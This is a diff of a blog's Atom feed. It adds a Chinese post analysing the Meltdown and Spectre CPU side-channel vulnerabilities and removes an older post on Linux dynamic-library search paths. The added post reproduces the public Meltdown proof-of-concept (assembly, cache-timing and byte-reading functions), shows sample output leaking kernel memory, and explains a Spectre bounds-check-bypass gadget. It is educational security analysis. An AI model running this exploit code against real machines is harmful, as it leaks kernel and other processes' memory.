@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2017-12-04T01:32:19.872Z</updated>
+  <updated>2018-01-09T14:18:59.888Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -14,6 +14,89 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击</title>
+    <link href="http://weaponx.site/2018/01/09/%E4%BB%8ECPU%E6%BC%8F%E6%B4%9EMeltdown-Spectre%EF%BC%88CVE-2017-5754-CVE-2017-5715-CVE-2017-5753%EF%BC%89%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
+    <id>http://weaponx.site/2018/01/09/从CPU漏洞Meltdown-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击/</id>
+    <published>2018-01-09T14:16:55.000Z</published>
+    <updated>2018-01-09T14:18:59.888Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击"><a href="#从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击" class="headerlink" title="从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击"></a>从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击</h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2018伊始，两个芯片级漏洞<code>Meltdown</code>（熔断）、<code>Spectre</code>（幽灵）漏洞震惊的安全界。受影响的CPU包括<code>Intel</code>、<code>AMD</code>和<code>ARM</code>，基本囊括的消费级CPU市场的绝大部分。<code>Meltdown</code>漏洞可以在用户态越权读取内核态的内存数据，<code>Spectre</code>漏洞可以通过浏览器的<code>Javascript</code>读取用户态的内存数据。虽然这两个漏洞对个人PC影响有限，但是确摧毁了公有云的基石——用户可在虚拟机里可以无限制的读取宿主机或者其他虚拟机的数据。</p>
+<h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>了解<code>Meltdown</code>和<code>Spectre</code>漏洞之前，首先要知道几个背景知识。现代CPU为了提高运算效率与运算速度，会采用以下的手段提高CPU运算速度：分支预测（<code>branch prediction</code>）、推测执行（<code>speculation execution</code>）和乱序执行（<code>out-of-order execution</code>）。</p>
+<ul>
+<li><p>分支预测与推测执行</p>
+<p>当包含CPU处理分支指令时就会遇到一个问题，根据判定条件的真/假的不同，有可能会产生跳转。此时CPU不会等待判定结果，而回预测出某一个条件分支去执行。</p>
+</li>
+<li><p>乱序执行</p>
+<p>CPU遇到指令依赖的情况时，会转向下条不依赖的指令去执行。</p>
+<p>​</p>
+</li>
+</ul>
+<h2 id="0x02-Meltdown漏洞分析"><a href="#0x02-Meltdown漏洞分析" class="headerlink" title="0x02 Meltdown漏洞分析"></a>0x02 Meltdown漏洞分析</h2><p><code>Meltdown</code>漏洞允许我们在用户态无限制的读取内核态的数据。我们来看一段代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">; rcx = kernel space address</div><div class="line">; rbx = user space address</div><div class="line">mov al, byte[rcx]</div><div class="line">shl al, 0xc</div><div class="line">mov rbx, qword[rbx + rax]</div></pre></td></tr></table></figure>
+<p>这段代码看上去并没有什么问题。因为在用户态的时候，在执行第一行代码时就会因为鉴权失败而停止执行后面的代码。</p>
+<p>然而，当现代CPU执行这一段代码时，由于之前提到的特性，CPU为了加快运算速度，在执行完第一行代码后，在耗时的鉴权时，会执行第二行、第三行代码。当鉴权失败后，CPU会将状态回滚，当作后面的代码没有执行，此时用户态程序还是没法获取到内核态的数据。</p>
+<p>但是，问题来了。CPU状态回滚后，缓存Cache并不会回滚，我们还是可以通过侧信道攻击（<code>Side Channel  Attack</code>）来猜测内核态的数据。此时，我们还要知道两点：第一，当CPU访问一个地址时，若没有在缓存中则会将这个地址所在的内存页（4KB = 4096B）放入缓存中；第二，访问缓存数据的速度远大于访问内存。</p>
+<p>这段代码在第一行取了<code>kernel address</code>存放的第一字节的数据，第二行将这个数据左移<code>0xc</code>位，相当于乘以<code>4096</code>，也就是<code>4K</code>。此时，这个数据就相当于一个内存页的<code>index</code>序号。第三行代码访问了这个地址，此时CPU会将这个内存页放入缓存中。接下来，我们遍历一下<code>index</code>从0到255号内存页，访问特别短的那个内存页的序号就是我们要猜测的数据。</p>
+<p>下面，我们通过图解来展示一下这个漏洞的原理。</p>
+<p>第一步，将<code>kernel space address</code>的第一字节放入<code>rax</code>的低<code>8</code>位，假设为<code>0x20</code>。</p>
+<p><img src="1.png" alt=""></p>
+<p>第二步，将<code>rax</code>的低8位左移<code>0xc</code>位，也就是<code>0x20 * 4096</code>。</p>
+<p>第三步，访问<code>rbx + rax</code>也就是<code>rbx + 0x20 * 4096</code>，此时会将这个地址所在的内存页放入缓存中。</p>
+<p>第四部，遍历<code>rbx + index * 4096</code>，若缓存命中，则说明此时的<code>index</code>就是<code>rcx</code>指向的内核态的第一字节数据。</p>
+<p><img src="2.png" alt=""></p>
+<p>此时，访问<code>rbx + 0x20 * 4096</code>命中缓存，所以<code>rcx</code> 指向内核态的第一字节数据为<code>0x20</code> 。</p>
+<p>接下来，我们看看<code>Github</code>上放出的<code>PoC</code>代码<a href="https://github.com/paboldin/meltdown-exploit/。因为这个代码同时支持`x86_64`和`i386`，所以核心汇编代码有两段。" target="_blank" rel="external">https://github.com/paboldin/meltdown-exploit/。因为这个代码同时支持`x86_64`和`i386`，所以核心汇编代码有两段。</a></p>
+<ul>
+<li><p>x86_64</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">    "1:\n\t"</div><div class="line">    ".rept 300\n\t"</div><div class="line">    "add $0x141, %%rax\n\t"</div><div class="line">    ".endr\n\t"</div><div class="line">    "movzx (%[addr]), %%eax\n\t"</div><div class="line">    "shl $12, %%rax\n\t"</div><div class="line">    "jz 1b\n\t"</div><div class="line">    "movzx (%[target], %%rax, 1), %%rbx\n"</div><div class="line">    "stopspeculate: \n\t"</div><div class="line">    "nop\n\t"</div><div class="line">    :</div><div class="line">    : [target] "r" (target_array),</div><div class="line">      [addr] "r" (addr)</div><div class="line">    : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>i386</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">  "1:\n\t"</div><div class="line">  ".rept 300\n\t"</div><div class="line">  "add $0x141, %%eax\n\t"</div><div class="line">  ".endr\n\t"</div><div class="line">  "movzx (%[addr]), %%eax\n\t"</div><div class="line">  "shl $12, %%eax\n\t"</div><div class="line">  "jz 1b\n\t"</div><div class="line">  "movzx (%[target], %%eax, 1), %%ebx\n"</div><div class="line">  "stopspeculate: \n\t"</div><div class="line">  "nop\n\t"</div><div class="line">  :</div><div class="line">  : [target] "r" (target_array),</div><div class="line">    [addr] "r" (addr)</div><div class="line">  : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
+<p>接着，我们看看这个<code>PoC</code>是如何判断是否命中<code>Cache</code>。首先<code>get_access_time</code>函数用来计算访问一个地址需要的时间。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></div><div class="line"><span class="title">get_access_time</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">char</span> *addr)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> time1, time2, junk;</div><div class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> j;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_RDTSCP</span></div><div class="line">  time1 = __rdtscp(&amp;junk);</div><div class="line">  j = *addr;</div><div class="line">  time2 = __rdtscp(&amp;junk);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">  time1 = __rdtsc();</div><div class="line">  j = *addr;</div><div class="line">  _mm_mfence();</div><div class="line">  time2 = __rdtsc();</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">  <span class="keyword">return</span> time2 - time1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接着通过计算缓存命中，和缓存未命中的时间得到一个阈值。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ESTIMATE_CYCLES   1000000</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">set_cache_hit_threshold</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">long</span> cached, uncached, i;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (<span class="number">0</span>) &#123;</div><div class="line">      cache_hit_threshold = <span class="number">80</span>;</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (cached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++)</div><div class="line">      cached += get_access_time(target_array);</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (cached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++)</div><div class="line">      cached += get_access_time(target_array);</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (uncached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++) &#123;</div><div class="line">      _mm_clflush(target_array);</div><div class="line">      uncached += get_access_time(target_array);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  cached /= ESTIMATE_CYCLES;</div><div class="line">  uncached /= ESTIMATE_CYCLES;</div><div class="line"></div><div class="line">  cache_hit_threshold = mysqrt(cached * uncached);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"cached = %ld, uncached = %ld, threshold %d\n"</span>,</div><div class="line">         cached, uncached, cache_hit_threshold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>给出我的机器上某次执行的结果<code>cached = 37, uncached = 218, threshold 89</code> 。明显可以看出，缓存命中需要的访问时间远远小于缓存未命中需要的时间。因此可以通过判断访问某个地址是否大于计算出的阈值来判断这个内存页是否被缓存过。</p>
+<p>猜测的函数如下：</p>
+  <figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CYCLES 1000</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">readbyte</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> i, ret = <span class="number">0</span>, max = <span class="number">-1</span>, maxi = <span class="number">-1</span>;</div><div class="line">  <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"></div><div class="line">  <span class="built_in">memset</span>(hist, <span class="number">0</span>, <span class="keyword">sizeof</span>(hist));</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CYCLES; i++) &#123;</div><div class="line">      ret = pread(fd, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</div><div class="line">      <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</div><div class="line">          perror(<span class="string">"pread"</span>);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      clflush_target();</div><div class="line"></div><div class="line">      speculate(addr);  <span class="comment">// 核心函数</span></div><div class="line">      check();          <span class="comment">// 判断哪个index命中cache</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; VARIANTS_READ; i++)</div><div class="line">      <span class="keyword">if</span> (hist[i] &gt; <span class="number">0</span>)</div><div class="line">          <span class="built_in">printf</span>(<span class="string">"addr %lx hist[%x] = %d\n"</span>, addr, i, hist[i]);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; VARIANTS_READ; i++) &#123;</div><div class="line">      <span class="keyword">if</span> (!<span class="built_in">isprint</span>(i))</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">if</span> (hist[i] &amp;&amp; hist[i] &gt; max) &#123;</div><div class="line">          max = hist[i];</div><div class="line">          maxi = i;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> maxi;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  这个<code>PoC</code>是使用方法是<code>meltdown addr length</code>，从<code>addr</code>的地址里读取<code>length</code>的数据。这个<code>PoC</code>以读取<code>/proc/version</code>为例，<code>/proc/version</code>的实现方法较复杂，在此不详细解释。</p>
+<p>这篇文章阐述了<code>Linux</code>内核如何渲染<code>/proc/version</code>文件的。所以，我们需要得到<code>linux_proc_banner</code>的基址。因为Linux存在ASLR，所以这个<code>PoC</code>用了一种投机取巧的方法，从<code>/proc/kallsyms</code>读了<code>linux_proc_banner</code>的地址，因此需要<code>root</code>权限。</p>
+<p>最终执行结果如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">cached = <span class="number">37</span>, uncached = <span class="number">222</span>, threshold <span class="number">90</span></div><div class="line">read ffffffff81800060 = <span class="number">25</span> % (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800061 = <span class="number">73</span> s (score=<span class="number">4</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800062 = <span class="number">20</span>   (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800063 = <span class="number">76</span> v (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800064 = <span class="number">65</span> e (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800065 = <span class="number">72</span> r (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800066 = <span class="number">73</span> s (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800067 = <span class="number">69</span> i (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800068 = <span class="number">6f</span> o (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800069 = <span class="number">6</span>e n (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006a = <span class="number">20</span>   (score=<span class="number">4</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006b = <span class="number">25</span> % (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006c = <span class="number">73</span> s (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006d = <span class="number">20</span>   (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006e = <span class="number">28</span> ( (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006f = <span class="number">62</span> b (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">VULNERABLE</div></pre></td></tr></table></figure>
+<p>不得不说，很牛逼！</p>
+<h2 id="0x03-Spectre漏洞分析"><a href="#0x03-Spectre漏洞分析" class="headerlink" title="0x03 Spectre漏洞分析"></a>0x03 Spectre漏洞分析</h2><p><code>Spectre</code>漏洞与<code>Meltdown</code>漏洞不同的是，<code>Spectre</code>漏洞允许读取本进程地址空间的任意数据。重要的是这个可以远程攻击，利用<code>JIT</code>的翻译机制，构造恶意<code>Javascript</code>代码来读取浏览器进程空间中别的网站的<code>cookie</code>等！就是一个超级<code>UXSS</code>！危害可见一斑。</p>
+<p>其实<code>Spectre</code>存在两个漏洞，也就是两个CVE-2017-5753和CVE-2017-5715。其中CVE-2017-5715是分支预测注入漏洞<code>BranchTarget Injection</code>目前没发现公开的<code>PoC</code>，CVE-2017-5753是边界检查绕过漏洞<code>BoundsCheck Bypass</code>有公开的<code>PoC</code>，下面分析这段<code>PoC</code> 。</p>
+<p>首先，我们来看一段代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>;</div><div class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>]  = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span> &#125;;</div><div class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>];</div><div class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;  </div><div class="line">    <span class="keyword">if</span> (x &lt; array1_size) &#123;  </div><div class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>很明显，代码有边界检查，我们无法越界读取别的地址的数据。但是，在CPU执行判断时，CPU会通过预测执行来执行<code>temp &amp;= array2[array1[x] * 512]</code>。 最后，因为判断不成立，所以状态回滚。根据<code>Meltdown</code>中的知识，我们可以知道，访问<code>array1[x]</code>和<code>array2[array1[x] * 512]</code>后，会将这两个数据缓存下来，而且回滚后缓存不清除。此时<code>array2[array1[x] * 512]</code>所在的物理页会被缓存，我们只需要遍历<code>0 - 255</code>即可猜到<code>array1[x]</code>的值。</p>
+<h2 id="0x04-侧信道攻击"><a href="#0x04-侧信道攻击" class="headerlink" title="0x04 侧信道攻击"></a>0x04 侧信道攻击</h2><p>之前tombkeeper教主曾在QCon2017的演讲《代码未写，漏洞已出——架构和设计的安全》中讲过一个例子，在Java 6.0时代，在信息摘要类中有一个函数<code>isEqual</code>用来验证<code>HMAC</code>等数据，它的实现如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">byte</span> digesta[], <span class="keyword">byte</span> digestb[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (digesta.length != digestb.length)</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digesta.length; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (digesta[i] != digestb[i])&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个函数看来貌似没有什么问题，但是我们假设<code>digestb</code>是我们已有的密钥，<code>digesta</code>是用户传入的密钥。程序匹配到两个密钥相同位不等的时候会退出。但是只要我们一位一位去猜，就可以利用微小的时间差将猜测速度提升无数倍。</p>
+<p>在2017年年初，就有一篇论文<code>ASLR on the Line: Practical Cache Attacks on the MMU</code>描述了通过Javascript侧信道攻击绕过系统的ASLR。</p>
+<p>可见这种平常我们不会注意到的问题越来越成为了计算机安全的一种威胁。</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>其实，侧信道攻击说到底还是设计上的缺陷，在为速度考虑的同时也需要考虑安全因素。</p>
+<blockquote>
+<p>在计算机中处理的数据，除了关注类型、长度、内容，还要考虑时间因子。什么时候时间开始，什么时候时间结束，持续多久，这些往往会影响安全。<br>–Tombkeeper</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击&quot;&gt;&lt;a href=&quot;#从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-
+    
+    </summary>
+    
+      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
+    
+    
+      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Spirited Away Writeup[pwnable.pw]</title>
@@ -959,46 +1042,6 @@
       <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
     
       <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Linux如何搜索动态库</title>
-    <link href="http://weaponx.site/2017/03/23/Linux%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E5%8A%A8%E6%80%81%E5%BA%93/"/>
-    <id>http://weaponx.site/2017/03/23/Linux如何搜索动态库/</id>
-    <published>2017-03-23T09:39:36.000Z</published>
-    <updated>2017-03-23T09:52:34.014Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在linux下安装一些程序，或者在做pwnable的时候经常出现没有找到动态库的情况。</p>
-<h2 id="0x01-如何链接动态库"><a href="#0x01-如何链接动态库" class="headerlink" title="0x01 如何链接动态库"></a>0x01 如何链接动态库</h2><p>链接动态库通常有五中方法：</p>
-<ol>
-<li>链接时使用静态库，gcc编译时添加参数</li>
-<li>使用<code>LD_LIBRARY_PATH</code>指定搜索路径, <code>export LD_LIBRARY_PATH=`pwd` </code></li>
-<li>编译时使用<code>-rpath</code>指定动态库的搜索路径</li>
-<li>修改<code>/etc/ld.so.conf</code>，添加动态库搜索路径</li>
-<li>复制动态库到系统默认的路径下，如<code>/lib</code>，<code>/usr/lib</code></li>
-</ol>
-<h2 id="0x02-动态库搜索路径的优先级"><a href="#0x02-动态库搜索路径的优先级" class="headerlink" title="0x02 动态库搜索路径的优先级"></a>0x02 动态库搜索路径的优先级</h2><p>动态库搜索路径优先级由高到低排列情况如下：</p>
-<ol>
-<li>编译时指定动态库搜索路径</li>
-<li>环境变量<code>LD_LIBRARY_PATH</code>中的路径</li>
-<li>配置文件<code>/etc/ld/so.conf</code>中的路径</li>
-<li>系统默认的路径<code>lib</code>等</li>
-</ol>
-<h2 id="0x03-Refer"><a href="#0x03-Refer" class="headerlink" title="0x03 Refer"></a>0x03 Refer</h2><p><a href="http://blog.csdn.net/liuxing_lanyue/article/details/20067423" target="_blank" rel="external">http://blog.csdn.net/liuxing_lanyue/article/details/20067423</a><br><a href="http://blog.csdn.net/onlyou930/article/details/6565906" target="_blank" rel="external">http://blog.csdn.net/onlyou930/article/details/6565906</a><br><a href="http://blog.chinaunix.net/uid-23069658-id-4028681.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-23069658-id-4028681.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;在linux下安装一些程序，或者在做pwnable的时候经常出现没有找到动态库的情况。&lt;/p&gt;
-&lt;h
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="Linux" scheme="http://weaponx.site/tags/Linux/"/>
     
   </entry>
   
